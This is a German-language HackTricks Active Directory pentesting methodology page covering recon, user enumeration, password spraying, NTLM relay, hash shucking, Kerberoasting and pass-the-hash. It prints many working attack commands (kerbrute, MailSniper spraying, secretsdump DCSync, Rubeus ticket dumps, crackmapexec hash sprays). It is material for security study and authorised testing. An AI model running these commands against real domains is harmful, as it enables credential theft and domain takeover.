# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Übersicht

**Active Directory** dient als grundlegende Technologie, die **network administrators** ermöglicht, **domains**, **users** und **objects** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist so konzipiert, dass es skalierbar ist und eine große Anzahl von Benutzern in handhabbare **groups** und **subgroups** organisiert, während auf verschiedenen Ebenen **access rights** kontrolliert werden.

Die Struktur von **Active Directory** besteht aus drei Hauptebenen: **domains**, **trees** und **forests**. Eine **domain** umfasst eine Sammlung von Objekten, wie **users** oder **devices**, die eine gemeinsame Datenbank teilen. **Trees** sind Gruppen dieser Domains, die durch eine gemeinsame Struktur verbunden sind, und ein **forest** stellt die Sammlung mehrerer Trees dar, die durch **trust relationships** verbunden sind und die oberste Ebene der Organisationsstruktur bilden. Auf jeder dieser Ebenen können spezifische **access**- und **communication rights** zugewiesen werden.

Wichtige Konzepte innerhalb von **Active Directory** sind:

1. **Directory** – Beinhaltet alle Informationen zu Active Directory-Objekten.
2. **Object** – Bezeichnet Entitäten im Directory, einschließlich **users**, **groups** oder **shared folders**.
3. **Domain** – Dient als Container für Directory-Objekte; mehrere Domains können innerhalb eines **forest** koexistieren, wobei jede ihre eigene Objektsammlungen hat.
4. **Tree** – Eine Gruppierung von Domains, die eine gemeinsame Root-Domain teilen.
5. **Forest** – Die oberste Organisationsstruktur in Active Directory, bestehend aus mehreren Trees mit **trust relationships** untereinander.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation in einem Netzwerk entscheidend sind. Diese Dienste beinhalten:

1. **Domain Services** – Zentralisiert die Datenspeicherung und verwaltet Interaktionen zwischen **users** und **domains**, einschließlich **authentication** und **search**-Funktionalität.
2. **Certificate Services** – Überwacht die Erstellung, Verteilung und Verwaltung sicherer **digital certificates**.
3. **Lightweight Directory Services** – Unterstützt directory-enabled Anwendungen über das **LDAP protocol**.
4. **Directory Federation Services** – Bietet **single-sign-on**-Funktionen, um Benutzer über mehrere Webanwendungen in einer Sitzung zu authentifizieren.
5. **Rights Management** – Hilft beim Schutz von urheberrechtlich geschütztem Material, indem es die unerlaubte Verbreitung und Nutzung reguliert.
6. **DNS Service** – Entscheidender Dienst zur Auflösung von **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

- **Pentest the network:**
- Scan the network, find machines and open ports and try to **exploit vulnerabilities** or **extract credentials** from them (for example, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerating DNS could give information about key servers in the domain as web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Take a look to the General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) to find more information about how to do this.
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- A more detailed guide on how to enumerate a SMB server can be found here:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.
- If you find the complete names of company workers, you could try different AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). The most common conventions are: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
- **No Authentication against MS-NRPC**: Using auth-level = 1 (No authentication) against the MS-NRPC (Netlogon) interface on domain controllers. The method calls the `DsrGetDcNameEx2` function after binding MS-NRPC interface to check if the user or computer exists without any credentials. The [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implements this type of enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn Sie einen dieser Server im Netzwerk finden, können Sie auch user enumeration dagegen durchführen. Zum Beispiel könnten Sie das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Du solltest jedoch die **Namen der im Unternehmen arbeitenden Personen** aus dem Recon-Schritt haben, den du zuvor durchgeführt haben solltest. Mit Vor- und Nachname kannst du das Script [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Benutzernamen zu generieren.

### Knowing one or several usernames

Ok, du weißt also bereits einen gültigen Benutzernamen, aber keine Passwörter... Dann versuche:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer **nicht** das Attribut _DONT_REQ_PREAUTH_ hat, kannst du eine **AS_REP message** für diesen Benutzer anfordern, die Daten enthält, die mit einer Ableitung des Benutzerpassworts verschlüsselt sind.
- [**Password Spraying**](password-spraying.md): Versuche die häufigsten **Passwörter** bei jedem der entdeckten Benutzer; vielleicht verwendet jemand ein schwaches Passwort (achte auf die Passwort-Richtlinie!).
- Beachte, dass du auch **spray OWA servers** versuchen kannst, um Zugriff auf die Mail-Server der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Du könntest in der Lage sein, einige Challenge-Hashes zu erhalten, die du cracken kannst, indem du bestimmte Protokolle des Netzwerks poisonst:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Wenn du das Active Directory erfolgreich enumeriert hast, hast du **mehr E-Mails und ein besseres Verständnis des Netzwerks**. Möglicherweise kannst du NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erzwingen, um Zugriff auf die AD-Umgebung zu erhalten.

### NetExec workspace-driven recon & relay posture checks

- Verwende **`nxcdb` workspaces**, um den AD-Recon-Status pro Engagement zu speichern: `workspace create <name>` erzeugt pro-Protokoll SQLite-DBs unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wechsel die Ansicht mit `proto smb|mssql|winrm` und liste gesammelte Geheimnisse mit `creds`. Sensible Daten manuell löschen, wenn fertig: `rm -rf ~/.nxc/workspaces/<name>`.
- Schnelle Subnetz-Erkennung mit **`netexec smb <cidr>`** liefert **domain**, **OS build**, **SMB signing requirements**, und **Null Auth**. Hosts, die `(signing:False)` anzeigen, sind **relay-prone**, während DCs oft Signing verlangen.
- Erzeuge **hostnames in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay to the DC is blocked** durch Signing, prüfe trotzdem die **LDAP**-Konfiguration: `netexec ldap <dc>` zeigt `(signing:None)` / schwache Channel Binding an. Ein DC mit erforderlichem SMB signing, aber deaktiviertem LDAP signing bleibt ein brauchbares **relay-to-LDAP** Ziel für Missbrauch wie **SPN-less RBCD**.

### Client-seitige Drucker-Zugangsdaten leaks → Massenhafte Domänen-Anmeldevalidierung

- Drucker-/Web-UIs betten manchmal **maskierte Admin-Passwörter im HTML ein**. Quelltext-Ansicht/Devtools kann Klartext offenbaren (z. B. `<input value="<password>">`), was Basic-auth-Zugriff auf Scan-/Druck-Repositories ermöglicht.
- Abgerufene Druckaufträge können **Klartext-Onboarding-Dokumente** mit pro-Benutzer-Passwörtern enthalten. Beim Testen Paarungen beibehalten:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM-Creds stehlen

Wenn du mit dem **null- oder guest-Benutzer** auf **andere PCs oder Shares** zugreifen kannst, könntest du **Dateien ablegen** (z. B. eine SCF-Datei), die beim Zugriff eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge** abgreifen kannst, um sie zu cracken:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos RC4-Tickets, NetNTLM-Challenges oder gecachte Credentials zu brute-forcen, fütterst du die NT-Hashes in Hashcat’s NT-candidate-Modi und lässt prüfen, ob Passwörter wiederverwendet werden, ohne jemals das Klartext-Passwort zu erfahren. Das ist besonders effektiv nach einer Domain-Übernahme, wenn du tausende aktuelle und historische NT-Hashes sammeln kannst.

Verwende shucking wenn:

- Du ein NT-Korpus aus DCSync, SAM/SECURITY-Dumps oder Credential Vaults hast und Wiederverwendung in anderen Domains/Forests testen willst.
- Du RC4-basiertes Kerberos-Material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-Antworten oder DCC/DCC2-Blobs erfasst hast.
- Du schnell Wiederverwendung für lange, unknackbare Passphrasen beweisen und sofort per Pass-the-Hash pivoten willst.

Die Technik **funktioniert nicht** gegen Verschlüsselungstypen, deren Schlüssel nicht der NT-Hash sind (z. B. Kerberos etype 17/18 AES). Wenn eine Domain ausschließlich AES erzwingt, musst du zu den regulären Passwort-Modi zurückkehren.

#### Aufbau eines NT-Hash-Korpus

- **DCSync/NTDS** – Verwende `secretsdump.py` mit history, um die größtmögliche Menge an NT-Hashes (und deren frühere Werte) zu erhalten:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-Einträge erweitern den Kandidatenpool erheblich, weil Microsoft bis zu 24 vorige Hashes pro Account speichern kann. Für weitere Methoden zum Ernten von NTDS-Secrets siehe:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM/SECURITY-Daten und gecachte Domain-Logons (DCC/DCC2). Duplikate entfernen und diese Hashes zur gleichen `nt_candidates.txt` Liste hinzufügen.
- **Metadaten verfolgen** – Behalte den Username/Domain, der jeden Hash produziert hat (auch wenn die Wortliste nur Hex enthält). Treffer zeigen dir sofort, welcher Principal ein Passwort wiederverwendet, sobald Hashcat den erfolgreichen Kandidaten ausgibt.
- Bevorzuge Kandidaten aus demselben Forest oder einem vertrauenswürdigen Forest; das maximiert die Chance auf Überlappung beim Shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Hinweise:

- NT-candidate-Eingaben **müssen rohe 32-hex NT-Hashes bleiben**. Deaktiviere Rule-Engines (kein `-r`, keine Hybrid-Modi), da Mangling das Kandidatenschlüsselmaterial zerstört.
- Diese Modi sind nicht per se schneller, aber der NTLM-Keyspace (~30.000 MH/s auf einem M3 Max) ist ~100× schneller als Kerberos RC4 (~300 MH/s). Das Testen einer kuratierten NT-Liste ist deutlich günstiger als das Durchsuchen des gesamten Passwortraums im langsamen Format.
- Führe immer das **aktuellste Hashcat-Build** aus (`git clone https://github.com/hashcat/hashcat && make install`), weil die Modi 31500/31600/35300/35400 kürzlich hinzugefügt wurden.
- Es gibt derzeit keinen NT-Modus für AS-REQ Pre-Auth, und AES-etypes (19600/19700) verlangen das Klartext-Passwort, weil ihre Schlüssel via PBKDF2 aus UTF-16LE-Passwörtern abgeleitet werden, nicht aus rohen NT-Hashes.

#### Beispiel – Kerberoast RC4 (mode 35300)

1. Erfasse ein RC4 TGS für ein Ziel-SPN mit einem niedrig privilegierten Benutzer (siehe die Kerberoast-Seite für Details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck das Ticket mit deiner NT-Liste:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat leitet den RC4-Schlüssel von jedem NT-Kandidaten ab und validiert den `$krb5tgs$23$...` Blob. Ein Treffer bestätigt, dass das Service-Account eines deiner vorhandenen NT-Hashes verwendet.

3. Sofortiges Pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Optional kannst du später das Klartextpasswort mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen, falls nötig.

#### Beispiel – Cached credentials (mode 31600)

1. Dump die gecachten Logons von einer kompromittierten Workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopiere die DCC2-Zeile für den interessanten Domain-Benutzer in `dcc2_highpriv.txt` und shuck sie:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ein erfolgreicher Treffer liefert den NT-Hash, der bereits in deiner Liste bekannt ist, und beweist, dass der gecachte Benutzer ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder brute-force ihn im schnellen NTLM-Modus, um den String zu rekonstruieren.

Der exakt gleiche Workflow gilt für NetNTLM Challenge-Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald ein Treffer identifiziert ist, kannst du Relay, SMB/WMI/WinRM PtH starten oder den NT-Hash offline mit Masks/Rules neu cracken.

## Enumerating Active Directory WITH credentials/session

Für diese Phase musst du die **Credentials oder eine Session eines gültigen Domain-Accounts kompromittiert** haben. Wenn du gültige Credentials oder eine Shell als Domain-User hast, solltest du daran denken, dass die zuvor genannten Optionen weiterhin Möglichkeiten bieten, andere Benutzer zu kompromittieren.

Bevor du mit der authentifizierten Enumeration beginnst, solltest du das **Kerberos double hop problem** kennen.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Einen Account kompromittiert zu haben ist ein **großer Schritt**, um die ganze Domain zu kompromittieren, denn du kannst jetzt mit der **Active Directory Enumeration** beginnen:

Bezüglich [**ASREPRoast**](asreproast.md) kannst du nun alle möglichen vulnerablen Benutzer finden, und bezüglich [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Benutzernamen** erhalten und das Passwort des kompromittierten Accounts, leere Passwörter und neue vielversprechende Passwörter ausprobieren.

- Du könntest die [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) verwenden
- Du kannst auch [**powershell for recon**](../basic-powershell-for-pentesters/index.html) verwenden, was stealthier ist
- Du kannst auch [**use powerview**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu extrahieren
- Ein weiteres großartiges Tool für Recon in Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht sehr stealthy** (abhängig von den verwendeten Collection-Methoden), aber **wenn dir das egal ist**, solltest du es auf jeden Fall ausprobieren. Finde, wo Benutzer RDP nutzen können, finde Pfade zu anderen Gruppen, etc.
- **Andere automatisierte AD-Enumerationstools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md), da diese interessante Informationen enthalten können.
- Ein **GUI-Tool**, das du zur Verzeichnis-Enumeration verwenden kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch die LDAP-Datenbank mit **ldapsearch** nach Credentials in den Feldern _userPassword_ & _unixUserPassword_ oder sogar in _Description_ durchsuchen. Vgl. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) für weitere Methoden.
- Wenn du **Linux** verwendest, kannst du die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du kannst auch automatisierte Tools ausprobieren wie:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-Benutzer extrahieren**

Es ist sehr einfach, alle Domain-Benutzernamen unter Windows zu erhalten (`net user /domain`, `Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Enumeration-Abschnitt klein wirkt, ist dies der wichtigste Teil von allem. Greife die Links (hauptsächlich die zu cmd, powershell, powerview und BloodHound) an, lerne, wie man eine Domain enumeriert und übe, bis du dich wohl fühlst. Während einer Bewertung ist dies der entscheidende Moment, um deinen Weg zu DA zu finden oder zu entscheiden, dass nichts unternommen werden kann.

### Kerberoast

Kerberoasting beinhaltet das Erlangen von **TGS-Tickets**, die von Services genutzt werden, die an Benutzerkonten gebunden sind, und das Offline-Cracken ihrer Verschlüsselung — welche auf Benutzerpasswörtern basiert.

Mehr dazu in:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sobald du einige Credentials erhalten hast, könntest du prüfen, ob du auf irgendeine **Maschine** zugreifen kannst. Dazu kannst du **CrackMapExec** verwenden, um mit verschiedenen Protokollen auf mehreren Servern entsprechend deinen Port-Scans Verbindungen zu versuchen.

### Local Privilege Escalation

Wenn du Credentials oder eine Session als normaler Domain-User kompromittiert hast und mit diesem Benutzer **Zugriff** auf **irgendeine Maschine in der Domain** hast, solltest du versuchen, lokal Privilegien zu eskalieren und nach Credentials zu suchen. Nur mit lokalen Administratorrechten kannst du die **Hashes anderer Benutzer** im Speicher (LSASS) und lokal (SAM) dumpen.

Es gibt eine komplette Seite in diesem Buch über [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) und eine [**Checklist**](../checklist-windows-privilege-escalation.md). Vergiss auch nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Current Session Tickets

Es ist sehr **unwahrscheinlich**, dass du **Tickets** im aktuellen Benutzer findest, die dir die **Berechtigung geben, auf** unerwartete Ressourcen zuzugreifen, aber du könntest prüfen:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Wenn du es geschafft hast, Active Directory zu enumerieren, wirst du **mehr E‑Mails und ein besseres Verständnis des Netzwerks** haben. Möglicherweise kannst du NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Suche nach Creds in Computer Shares | SMB Shares

Da du jetzt einige grundlegende Credentials hast, solltest du prüfen, ob du **irgendwelche interessanten Dateien findest, die innerhalb des AD geteilt werden**. Du könntest das manuell machen, aber das ist eine sehr langweilige, sich wiederholende Aufgabe (und noch mehr, wenn du Hunderte von Dokumenten prüfen musst).

[**Folge diesem Link, um Tools kennenzulernen, die du verwenden könntest.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds stehlen

Wenn du auf **andere PCs oder Shares zugreifen** kannst, könntest du **Dateien ablegen** (wie eine SCF file), die, falls sie aufgerufen werden, eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM challenge** stehlen kannst, um sie zu cracken:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle erlaubte jedem authentifizierten Benutzer, den **Domain Controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Für die folgenden Techniken reicht ein normaler Domain-Benutzer nicht aus; du benötigst spezielle Privilegien/Credentials, um diese Angriffe durchzuführen.**

### Hash extraction

Hoffentlich ist es dir gelungen, ein **lokales Admin**-Konto zu kompromittieren, z. B. mit [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) oder durch [lokale Privilegieneskalation](../windows-local-privilege-escalation/index.html).  
Dann ist es Zeit, alle Hashes im Speicher und lokal zu dumpen.  
[**Lies diese Seite über verschiedene Wege, die Hashes zu erhalten.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du ihn verwenden, um dich als diesen Benutzer auszugeben.  
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung mit** diesem **Hash durchführt**, **oder** du kannst einen neuen **sessionlogon** erstellen und den **Hash** in **LSASS** injizieren, sodass bei jeder **NTLM-Authentifizierung** dieser **Hash verwendet wird.** Letztere Option ist das, was mimikatz macht.  
[**Lies diese Seite für mehr Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, den NTLM-Hash eines Benutzers zu verwenden, um Kerberos-Tickets anzufordern, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders nützlich in Netzwerken sein, in denen das NTLM-Protokoll deaktiviert ist und nur Kerberos als Authentifizierungsprotokoll erlaubt ist.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Attacke **Pass The Ticket (PTT)** stehlen Angreifer das Authentifizierungs-Ticket eines Benutzers anstelle seines Passworts oder seiner Hashwerte. Dieses gestohlene Ticket wird dann verwendet, um sich als den Benutzer auszugeben und unautorisierten Zugriff auf Ressourcen und Dienste im Netzwerk zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrators** hast, solltest du versuchen, dich lokal auf anderen **PCs** damit einzuloggen.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass dies ziemlich **auffällig** ist und **LAPS** es **mildern** würde.

### MSSQL Abuse & Trusted Links

Wenn ein Benutzer die Rechte hat, **auf MSSQL-Instanzen zuzugreifen**, könnte er diese nutzen, um **Befehle auf dem MSSQL-Host auszuführen** (falls dieser als SA läuft), den NetNTLM-**Hash** zu **stehlen** oder sogar eine **relay** **attack** durchzuführen.\
Außerdem, wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz vertraut wird (database link). Wenn der Benutzer Rechte auf der vertrauten Datenbank hat, kann er die Vertrauensbeziehung **nutzen, um auch in der anderen Instanz Abfragen auszuführen**. Diese Trusts können verkettet werden und irgendwann könnte der Benutzer eine falsch konfigurierte Datenbank finden, in der er Befehle ausführen kann.\
**Die Verbindungen zwischen Datenbanken funktionieren sogar über Forest-Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Inventar- und Deployment-Suites von Drittanbietern bieten oft mächtige Pfade zu credentials und code execution. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computerobjekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und du Domain-Rechte auf dem Computer hast, kannst du TGTs aus dem Speicher aller Benutzer auslesen, die sich an dem Computer anmelden.\
Wenn sich also ein **Domain Admin** an dem Computer anmeldet, kannst du seinen TGT auslesen und ihn mittels [Pass the Ticket](pass-the-ticket.md) impersonieren.\
Dank constrained delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich ist es ein DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn einem Benutzer oder Computer "Constrained Delegation" erlaubt ist, kann er **sich als beliebigen Benutzer ausgeben, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn du dann den **Hash dieses Benutzers/Computers kompromittierst**, kannst du **jeden Benutzer ausgeben** (sogar Domain Admins), um auf bestimmte Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Das Haben von **WRITE**-Berechtigung auf ein Active Directory-Objekt eines entfernten Computers ermöglicht die Erlangung von code execution mit **erhöhten Rechten**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Der kompromittierte Benutzer könnte einige **interessante Privilegien auf bestimmte Domain-Objekte** haben, die es dir erlauben, dich lateral zu bewegen/**Privilegien zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Das Auffinden eines **Spool service, der innerhalb der Domain lauscht**, kann dazu **missbraucht** werden, **neue credentials zu erlangen** und **Privilegien zu eskalieren**.


{{#ref}}
